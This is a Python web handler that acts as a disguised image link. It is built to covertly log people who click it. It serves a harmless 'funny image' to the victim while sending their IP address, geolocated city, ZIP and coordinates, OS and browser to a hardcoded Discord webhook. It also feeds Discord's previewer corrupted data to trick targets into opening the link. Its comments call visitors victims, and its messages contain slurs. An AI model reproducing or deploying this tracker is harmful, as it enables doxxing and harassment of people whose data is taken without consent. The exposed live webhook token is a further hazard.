from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser

# === PUT YOUR REAL DISCORD WEBHOOK HERE ===
webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

# URL of the clean funny image (shows when victim opens in browser)
clean_image_url = 'https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1'

# Set to False = sneaky mode: Discord gets corrupted image → no preview, shows loading/broken
# Set to True = previews image (less clicks, but grabs on embed sometimes)
show_clean_to_discord = False

# Corrupted "bugged" image data — Discord can't render this, forces "open in browser"
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [{
            "title": "DADDY BOB STRIKES AGAIN!",
            "color": 16711803,
            "description": "A New Retard Opened The \"Gif\" LOL.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {"name": "IP Info", "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}", "inline": True},
                {"name": "Advanced Info", "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}", "inline": False}
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord previewed the image. Real grab incoming soon?\n\n**Proxy IP:** `{ip}`\n**UserAgent:** `{uag}`",
            "author": {"name": "Fentanyl"}
        }]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get client IP
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'

            useragent = self.headers.get('user-agent', 'No User Agent Found!')
            os, browser = httpagentparser.simple_detect(useragent)

            # Detect if request is from Discord's media proxy
            is_discord = ('discord' in useragent.lower() or 
                          ip.startswith(('162.158.', '164.114.', '104.196.', '104.244.', '141.101.')))

            # Optional: load external image via ?url=
            query = parse.urlsplit(self.path).query
            params = dict(parse.parse_qsl(query))
            external_url = params.get('url')

            # Fetch clean image only when needed
            if external_url:
                try:
                    clean_data = httpx.get(external_url, timeout=10).content
                except:
                    clean_data = httpx.get(clean_image_url, timeout=10).content
            else:
                clean_data = httpx.get(clean_image_url, timeout=10).content

            # Send response
            self.send_response(200)
            # Use 'image/gif' to make it feel more like a loading GIF
            self.send_header('Content-type', 'image/gif')  # ← Change to 'image/jpeg' if you prefer
            self.end_headers()

            if is_discord:
                # Discord gets the corrupted version → broken preview / endless loading
                self.wfile.write(buggedbin if not show_clean_to_discord else clean_data)
                httpx.post(webhook, json=prev(ip, useragent))
            else:
                # Real user opens in browser → sees clean funny image + we grab everything
                self.wfile.write(clean_data)
                try:
                    ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=10).json()
                    payload = formatHook(
                        ipInfo.get('ip', ip),
                        ipInfo.get('city', 'Unknown'),
                        ipInfo.get('region', 'Unknown'),
                        ipInfo.get('country', 'Unknown'),
                        ipInfo.get('loc', 'Unknown'),
                        ipInfo.get('org', 'Unknown'),
                        ipInfo.get('postal', 'Unknown'),
                        useragent, os, browser
                    )
                    httpx.post(webhook, json=payload)
                except:
                    # Fallback if ipinfo fails
                    httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))

        except Exception as e:
            # Ultimate safety net
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(httpx.get(clean_image_url).content)
            except:
                pass

        return
